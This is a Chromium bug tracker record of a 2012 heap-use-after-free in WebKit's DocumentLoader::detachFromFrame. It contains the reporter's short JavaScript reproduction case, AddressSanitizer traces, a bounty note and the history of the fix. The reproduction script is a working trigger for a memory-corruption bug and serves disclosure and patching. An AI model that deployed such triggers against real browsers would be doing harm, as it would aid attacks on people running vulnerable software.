# Heap-use-after-free in WebCore::DocumentLoader::detachFromFrame

| Field | Value |
|-------|-------|
| **Issue ID** | [40052888](https://issues.chromium.org/issues/40052888) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-01-19 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free

**VERSION**  

Chrome Version: dev

Chromium 18.0.1013.0 (Developer Build 118291)  

OS Linux  

WebKit 535.18 (@105390)  

JavaScript V8 3.8.6

(nullptr in beta and stable)

Operating System: linux 64bit

**REPRODUCTION CASE**

<script>
var a='<iframe src="data:text/html,<script>addEventListener(\'unload\', function() { var evt = document.createEvent(\'MouseEvents\'); evt.initMouseEvent(\'click\'); x.dispatchEvent(evt);})</'+'script><a id=\'x\' target=\'\_top\' href=\'\'></a>">;'
document.write(a)
setTimeout(function() { document.location.reload() }, 10)
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==26870== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffeccd0b40 at pc 0x55555a2f1131 bp 0x7fffffff9120 sp 0x7fffffff9118  

READ of size 8 at 0x7fffeccd0b40 thread T0  

#0 0x55555a2f1131 in WebCore::DocumentLoader::detachFromFrame() ???:0  

#1 0x55555a33e5e3 in WebCore::FrameLoader::transitionToCommitted(WTF::PassRefPtr[WebCore::CachedPage](javascript:void(0);)) ???:0

0x7fffeccd0b40 is located 2752 bytes inside of 2896-byte region [0x7fffeccd0080,0x7fffeccd0bd0)  

freed by thread T0 here:  

#0 0x55555d5e5c74 in free ??:0  

#1 0x55555a2ef40c in WebCore::DocumentLoader::stopLoading() ???:0  

#2 0x55555a2f1086 in WebCore::DocumentLoader::detachFromFrame() ???:0

## Attachments

- [domcache.html](attachments/domcache.html) (text/plain; charset=us-ascii, 352 B)
- [vg-trunk.txt](attachments/vg-trunk.txt) (text/x-c; charset=us-ascii, 11.8 KB)
- [asan-trunk.txt](attachments/asan-trunk.txt) (text/x-c; charset=us-ascii, 8.6 KB)
- [asan-stable.txt](attachments/asan-stable.txt) (text/plain; charset=us-ascii, 2.6 KB)
- [asan-beta.txt](attachments/asan-beta.txt) (text/plain; charset=us-ascii, 2.5 KB)

## Timeline

### in...@chromium.org (2012-01-19)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=14358577

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f0dfa6cabb0
Crash State:
  - crash stack -
  WebCore::DocumentLoader::detachFromFrame
  WebCore::FrameLoader::transitionToCommitted
  - free stack -
  WebCore::DocumentLoader::stopLoading
  WebCore::DocumentLoader::detachFromFrame
  

Minimized Testcase (0.34 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95yGzRWkJFM_mqng0TB59iHux95CzfcXKtAZwoTSammL15E0q4S2GJ5duoRFvYBhtyygcx0zTlD9LNLEQxkuXhvpSPHY3haEf3-qe86HWae5iC_oCBY-iZSDCbVNBuqMCarO1n5m1EJWdcNEiQ6oltMQcZ7ag

### in...@chromium.org (2012-01-19)

Regressed in http://trac.webkit.org/changeset/104593

### in...@chromium.org (2012-01-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-20)

Brady from Apple is looking at this.

### js...@chromium.org (2012-01-20)

Is there an associated WebKit bug?

### in...@chromium.org (2012-01-20)

Yes, https://bugs.webkit.org/show_bug.cgi?id=62764 is the tracking bug.

### in...@chromium.org (2012-01-23)

https://trac.webkit.org/changeset/105556. m18 branch point is close, keeping for tracking, until we are sure.

### sc...@gmail.com (2012-01-23)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-01-24)

@miaubiz: thanks for the fast regression catch. $1000

### in...@chromium.org (2012-01-25)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-27)

Unfortunately not fixed, confirmed by ClusterFuzz and verified by me locally :(


=================================================================
==31040== ERROR: AddressSanitizer heap-use-after-free on address 0x7f9dcfe49c20 at pc 0x7f9de158adb8 bp 0x7f9dbdff7270 sp 0x7f9dbdff7268
READ of size 8 at 0x7f9dcfe49c20 thread T15
    #0 0x7f9de158adb8 in WebCore::DocumentLoader::detachFromFrame() Source/WebCore/loader/DocumentLoader.cpp:415
    #1 0x7f9de15d4af1 in WebCore::FrameLoader::setProvisionalDocumentLoader(WebCore::DocumentLoader*) Source/WebCore/loader/FrameLoader.cpp:1712
    #2 0x7f9de15d3046 in ~PassRefPtr Source/JavaScriptCore/wtf/PassRefPtr.h:67
    #3 0x7f9de1589987 in WebCore::DocumentLoader::commitIfReady() Source/WebCore/loader/DocumentLoader.cpp:284
    #4 0x7f9de1621dee in WebCore::ResourceLoader::didReceiveData(char const*, int, long long, bool) Source/WebCore/loader/ResourceLoader.cpp:291
    #5 0x7f9de15fe810 in WebCore::MainResourceLoader::didReceiveData(char const*, int, long long, bool) Source/WebCore/loader/MainResourceLoader.cpp:464
    #6 0x7f9de16234db in WebCore::InspectorInstrumentation::hasFrontends() Source/WebCore/inspector/InspectorInstrumentation.h:217
    #7 0x7f9de02bc539 in ResourceDispatcher::OnReceivedData(IPC::Message const&, int, base::FileDescriptor, int, int) /usr/local/google/home/aarya/chrome2/src/content/common/resource_dispatcher.cc:404
    #8 0x7f9de02bac7b in ResourceDispatcher::DispatchMessage(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/./content/common/resource_messages.h:154
    #9 0x7f9de02b8a58 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/content/common/resource_dispatcher.cc:326
    #10 0x7f9de01c096f in ChildThread::OnMessageReceived(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/content/common/child_thread.cc:171
    #11 0x7f9de0311fc9 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/ipc/ipc_channel_proxy.cc:263
    #12 0x7f9ddea51ae6 in base::Callback<void ()()>::Run() const /usr/local/google/home/aarya/chrome2/src/./base/callback.h:272
    #13 0x7f9ddea52348 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:470
    #14 0x7f9ddea53639 in MessageLoop::DoWork() /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:660
    #15 0x7f9ddea5e347 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) /usr/local/google/home/aarya/chrome2/src/base/message_pump_default.cc:28
    #16 0x7f9ddea5066e in MessageLoop::RunInternal() /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:418
    #17 0x7f9ddea4e80f in ~AutoRunState /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:745
    #18 0x7f9ddeacb58c in base::Thread::ThreadMain() /usr/local/google/home/aarya/chrome2/src/base/threading/thread.cc:161
    #19 0x7f9ddeac20ec in base::(anonymous namespace)::ThreadFunc(void*) /usr/local/google/home/aarya/chrome2/src/base/threading/platform_thread_posix.cc:58
    #20 0x7f9de4a0f787 in __asan::AsanThread::ThreadStart() ??:0
0x7f9dcfe49c20 is located 2976 bytes inside of 3120-byte region [0x7f9dcfe49080,0x7f9dcfe49cb0)
freed by thread T15 here:
    #0 0x7f9de4a0bd12 in free ??:0
    #1 0x7f9de1588f4c in ~RefPtr Source/JavaScriptCore/wtf/RefCounted.h:183
    #2 0x7f9de158aca4 in WTF::OwnPtr<WebCore::ApplicationCacheHost>::operator->() const Source/JavaScriptCore/wtf/OwnPtr.h:64
    #3 0x7f9de15d4af1 in WebCore::FrameLoader::setProvisionalDocumentLoader(WebCore::DocumentLoader*) Source/WebCore/loader/FrameLoader.cpp:1712
    #4 0x7f9de15d3046 in ~PassRefPtr Source/JavaScriptCore/wtf/PassRefPtr.h:67
    #5 0x7f9de1589987 in WebCore::DocumentLoader::commitIfReady() Source/WebCore/loader/DocumentLoader.cpp:284
    #6 0x7f9de1621dee in WebCore::ResourceLoader::didReceiveData(char const*, int, long long, bool) Source/WebCore/loader/ResourceLoader.cpp:291
    #7 0x7f9de15fe810 in WebCore::MainResourceLoader::didReceiveData(char const*, int, long long, bool) Source/WebCore/loader/MainResourceLoader.cpp:464
    #8 0x7f9de16234db in WebCore::InspectorInstrumentation::hasFrontends() Source/WebCore/inspector/InspectorInstrumentation.h:217
    #9 0x7f9de02bc539 in ResourceDispatcher::OnReceivedData(IPC::Message const&, int, base::FileDescriptor, int, int) /usr/local/google/home/aarya/chrome2/src/content/common/resource_dispatcher.cc:404
    #10 0x7f9de02bac7b in ResourceDispatcher::DispatchMessage(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/./content/common/resource_messages.h:154
    #11 0x7f9de02b8a58 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/content/common/resource_dispatcher.cc:326
    #12 0x7f9de01c096f in ChildThread::OnMessageReceived(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/content/common/child_thread.cc:171
    #13 0x7f9de0311fc9 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/ipc/ipc_channel_proxy.cc:263
    #14 0x7f9ddea51ae6 in base::Callback<void ()()>::Run() const /usr/local/google/home/aarya/chrome2/src/./base/callback.h:272
    #15 0x7f9ddea52348 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:470
    #16 0x7f9ddea53639 in MessageLoop::DoWork() /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:660
    #17 0x7f9ddea5e347 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) /usr/local/google/home/aarya/chrome2/src/base/message_pump_default.cc:28
    #18 0x7f9ddea5066e in MessageLoop::RunInternal() /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:418
    #19 0x7f9ddea4e80f in ~AutoRunState /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:745
    #20 0x7f9ddeacb58c in base::Thread::ThreadMain() /usr/local/google/home/aarya/chrome2/src/base/threading/thread.cc:161
    #21 0x7f9ddeac20ec in base::(anonymous namespace)::ThreadFunc(void*) /usr/local/google/home/aarya/chrome2/src/base/threading/platform_thread_posix.cc:58
    #22 0x7f9de4a0f787 in __asan::AsanThread::ThreadStart() ??:0
previously allocated by thread T15 here:
    #0 0x7f9de4a0bdd2 in malloc ??:0
    #1 0x7f9de049f93b in WTF::fastMalloc(unsigned long) Source/JavaScriptCore/wtf/FastMalloc.cpp:268
    #2 0x7f9de04488ce in WTF::RefCounted<WebCore::DocumentLoader>::operator new(unsigned long) Source/JavaScriptCore/wtf/RefCounted.h:178
    #3 0x7f9de041bade in WTF::PassRefPtr<WebKit::WebDataSourceImpl>::leakRef() const Source/JavaScriptCore/wtf/PassRefPtr.h:161
    #4 0x7f9de15cb33b in WTF::PassRefPtr<WebCore::DocumentLoader>::leakRef() const Source/JavaScriptCore/wtf/PassRefPtr.h:161
    #5 0x7f9de15c2ea1 in WebCore::FrameLoader::loadURL(WebCore::KURL const&, WTF::String const&, WTF::String const&, bool, WebCore::FrameLoadType, WTF::PassRefPtr<WebCore::Event>, WTF::PassRefPtr<WebCore::FormState>) Source/WebCore/loader/FrameLoader.cpp:1234
    #6 0x7f9de15c2722 in ~PassRefPtr Source/JavaScriptCore/wtf/PassRefPtr.h:67
    #7 0x7f9de15b67a9 in WebCore::FrameLoader::loadFrameRequest(WebCore::FrameLoadRequest const&, bool, bool, WTF::PassRefPtr<WebCore::Event>, WTF::PassRefPtr<WebCore::FormState>, WebCore::ShouldSendReferrer) Source/WebCore/loader/FrameLoader.cpp:1166
    #8 0x7f9de15b4b05 in WebCore::FrameLoader::urlSelected(WebCore::FrameLoadRequest const&, WTF::PassRefPtr<WebCore::Event>, bool, bool, WebCore::ShouldSendReferrer, WebCore::ShouldReplaceDocumentIfJavaScriptURL) Source/WebCore/loader/FrameLoader.cpp:284
    #9 0x7f9de15b56f5 in ~PassRefPtr Source/JavaScriptCore/wtf/PassRefPtr.h:67
    #10 0x7f9de0ab161b in ~PassRefPtr Source/JavaScriptCore/wtf/PassRefPtr.h:67
    #11 0x7f9de0aafca6 in WebCore::HTMLAnchorElement::defaultEventHandler(WebCore::Event*) Source/WebCore/html/HTMLAnchorElement.cpp:159
    #12 0x7f9de0a83712 in WTF::PassRefPtr<WebCore::Event>::operator->() const Source/JavaScriptCore/wtf/PassRefPtr.h:76
    #13 0x7f9de0a7e644 in WebCore::EventDispatchMediator::dispatchEvent(WebCore::EventDispatcher*) const Source/WebCore/dom/EventDispatchMediator.cpp:51
    #14 0x7f9de0a80407 in WebCore::EventDispatcher::dispatchEvent(WebCore::Node*, WTF::PassRefPtr<WebCore::EventDispatchMediator>) Source/WebCore/dom/EventDispatcher.cpp:55
    #15 0x7f9de09cad57 in WebCore::Node::dispatchEvent(WTF::PassRefPtr<WebCore::Event>) Source/WebCore/dom/Node.cpp:2761
    #16 0x7f9de099549f in WebCore::EventTarget::dispatchEvent(WTF::PassRefPtr<WebCore::Event>, int&) Source/WebCore/dom/EventTarget.cpp:168
    #17 0x7f9de246dafd in WebCore::NodeInternal::dispatchEventCallback(v8::Arguments const&) /usr/local/google/home/aarya/chrome2/src/out/Release/obj/gen/webcore/bindings/V8Node.cpp:329
    #18 0x7f9ddf7a2ca8 in HandleApiCallHelper /usr/local/google/home/aarya/chrome2/src/v8/src/builtins.cc:1220
    #19 0x34d14600420e
    #20 0x34d146034174
    #21 0x34d14600796e
Thread T15 created by T0 here:
    #0 0x7f9de4a09d03 in pthread_create ??:0
    #1 0x7f9ddeac1ca9 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate*, unsigned long*) /usr/local/google/home/aarya/chrome2/src/base/threading/platform_thread_posix.cc:119
    #2 0x7f9ddeac1baa in base::PlatformThread::Create(unsigned long, base::PlatformThread::Delegate*, unsigned long*) /usr/local/google/home/aarya/chrome2/src/base/threading/platform_thread_posix.cc:223
    #3 0x7f9ddeacae5c in base::Thread::StartWithOptions(base::Thread::Options const&) /usr/local/google/home/aarya/chrome2/src/base/threading/thread.cc:72
    #4 0x7f9de311b137 in RenderProcessHostImpl::Init(bool) /usr/local/google/home/aarya/chrome2/src/content/browser/renderer_host/render_process_host_impl.cc:409
    #5 0x7f9de312fefe in RenderViewHost::CreateRenderView(std::basic_string<unsigned short, base::string16_char_traits, std::allocator<unsigned short> > const&, int) /usr/local/google/home/aarya/chrome2/src/content/browser/renderer_host/render_view_host.cc:174
    #6 0x7f9de3203a23 in TabContents::CreateRenderViewForRenderManager(RenderViewHost*) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/tab_contents.cc:2240
    #7 0x7f9de3203c6d in non-virtual thunk to TabContents::CreateRenderViewForRenderManager(RenderViewHost*) ???:0
    #8 0x7f9de3350dbf in RenderViewHostManager::InitRenderView(RenderViewHost*, content::NavigationEntryImpl const&) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/render_view_host_manager.cc:552
    #9 0x7f9de31f4218 in TabContents::NavigateToEntry(content::NavigationEntryImpl const&, content::NavigationController::ReloadType) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/tab_contents.cc:830
    #10 0x7f9de31f40d7 in TabContents::NavigateToPendingEntry(content::NavigationController::ReloadType) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/tab_contents.cc:818
    #11 0x7f9de31d6182 in NavigationControllerImpl::NavigateToPendingEntry(content::NavigationController::ReloadType) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/navigation_controller_impl.cc:1245
    #12 0x7f9de31d70b9 in NavigationControllerImpl::LoadEntry(content::NavigationEntryImpl*) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/navigation_controller_impl.cc:324
    #13 0x7f9ddd572fc0 in ~GURL /usr/local/google/home/aarya/chrome2/src/./googleurl/src/gurl.h:42
    #14 0x7f9ddd55b728 in BrowserInit::LaunchWithProfile::OpenTabsInBrowser(Browser*, bool, std::vector<BrowserInit::LaunchWithProfile::Tab, std::allocator<BrowserInit::LaunchWithProfile::Tab> > const&) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:1206
    #15 0x7f9ddd5575e3 in BrowserInit::LaunchWithProfile::ProcessSpecifiedURLs(std::vector<GURL, std::allocator<GURL> > const&) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:1116
    #16 0x7f9ddd5563a0 in BrowserInit::LaunchWithProfile::ProcessStartupURLs(std::vector<GURL, std::allocator<GURL> > const&) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:1077
    #17 0x7f9ddd554176 in BrowserInit::LaunchWithProfile::ProcessLaunchURLs(bool, std::vector<GURL, std::allocator<GURL> > const&) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:998
    #18 0x7f9ddd55198a in BrowserInit::LaunchWithProfile::Launch(Profile*, std::vector<GURL, std::allocator<GURL> > const&, bool) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:839
    #19 0x7f9ddd54f2e7 in BrowserInit::LaunchBrowser(CommandLine const&, Profile*, FilePath const&, BrowserInit::IsProcessStartup, BrowserInit::IsFirstRun, int*) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:666
    #20 0x7f9ddd55fc4d in BrowserInit::ProcessCmdLineImpl(CommandLine const&, FilePath const&, bool, Profile*, std::vector<Profile*, std::allocator<Profile*> > const&, int*, BrowserInit*) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:1716
    #21 0x7f9dde474262 in ChromeBrowserMainParts::parsed_command_line() const /usr/local/google/home/aarya/chrome2/src/./chrome/browser/ui/browser_init.h:54
    #22 0x7f9dde471292 in ChromeBrowserMainParts::PreMainMessageLoopRun() /usr/local/google/home/aarya/chrome2/src/chrome/browser/chrome_browser_main.cc:1310
    #23 0x7f9de2facd3c in content::BrowserMainLoop::RunMainMessageLoopParts(bool*) /usr/local/google/home/aarya/chrome2/src/content/browser/browser_main_loop.cc:398
    #24 0x7f9de2faa2a6 in BrowserMain(content::MainFunctionParams const&) /usr/local/google/home/aarya/chrome2/src/content/browser/browser_main.cc:102
    #25 0x7f9dde9a8acc in (anonymous namespace)::RunNamedProcessTypeMain(std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate*) /usr/local/google/home/aarya/chrome2/src/content/app/content_main.cc:264
    #26 0x7f9dde9a82e0 in content::ContentMain(int, char const**, content::ContentMainDelegate*) /usr/local/google/home/aarya/chrome2/src/content/app/content_main.cc:455
    #27 0x7f9ddd0bfb97 in ChromeMain /usr/local/google/home/aarya/chrome2/src/chrome/app/chrome_main.cc:32
    #28 0x7f9ddd0bfa9b in main /usr/local/google/home/aarya/chrome2/src/chrome/app/chrome_exe_main_gtk.cc:18
    #29 0x7f9dd652cc4d in __libc_start_main /build/buildd/eglibc-2.11.1/csu/libc-start.c:258
==31040== ABORTING
Stats: 43M malloced (70M for red zones) by 213901 calls
Stats: 1M realloced by 11102 calls
Stats: 32M freed by 156279 calls
Stats: 0M really freed by 0 calls
Stats: 148M (37905 full pages) mmaped in 37 calls
  mmaps   by size class: 8:212979; 9:16382; 10:16380; 11:2047; 12:1024; 13:512; 14:512; 15:128; 16:320; 17:32; 18:16; 21:2; 22:4;
  mallocs by size class: 8:191657; 9:5707; 10:13828; 11:1218; 12:650; 13:189; 14:327; 15:22; 16:272; 17:20; 18:6; 21:1; 22:4;
  frees   by size class: 8:137404; 9:3719; 10:13164; 11:861; 12:432; 13:132; 14:282; 15:12; 16:259; 17:7; 18:4; 21:1; 22:2;
  rfrees  by size class:
Stats: malloc large: 31 small slow: 807
Shadow byte and word:
  0x1ff3b9fc9384: fd
  0x1ff3b9fc9380: fd fd fd fd fd fd fd fd
More shadow bytes:
  0x1ff3b9fc9360: fd fd fd fd fd fd fd fd
  0x1ff3b9fc9368: fd fd fd fd fd fd fd fd
  0x1ff3b9fc9370: fd fd fd fd fd fd fd fd
  0x1ff3b9fc9378: fd fd fd fd fd fd fd fd
=>0x1ff3b9fc9380: fd fd fd fd fd fd fd fd
  0x1ff3b9fc9388: fd fd fd fd fd fd fd fd
  0x1ff3b9fc9390: fd fd fd fd fd fd fd fd
  0x1ff3b9fc9398: fd fd fd fd fd fd fd fd
  0x1ff3b9fc93a0: fa fa fa fa fa fa fa fa


### in...@chromium.org (2012-01-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-27)

http://trac.webkit.org/changeset/106130. Much thanks to Brady for review.

### in...@chromium.org (2012-01-30)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 119479:119590.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=14358577

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f0dfa6cabb0
Crash State:
  - crash stack -
  WebCore::DocumentLoader::detachFromFrame
  WebCore::FrameLoader::transitionToCommitted
  - free stack -
  WebCore::DocumentLoader::stopLoading
  WebCore::DocumentLoader::detachFromFrame
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=117116:117171
Fixed: https://cluster-fuzz.appspot.com/revisions?range=119479:119590

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95yGzRWkJFM_mqng0TB59iHux95CzfcXKtAZwoTSammL15E0q4S2GJ5duoRFvYBhtyygcx0zTlD9LNLEQxkuXhvpSPHY3haEf3-qe86HWae5iC_oCBY-iZSDCbVNBuqMCarO1n5m1EJWdcNEiQ6oltMQcZ7ag

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/110764?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/111865]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052888)*
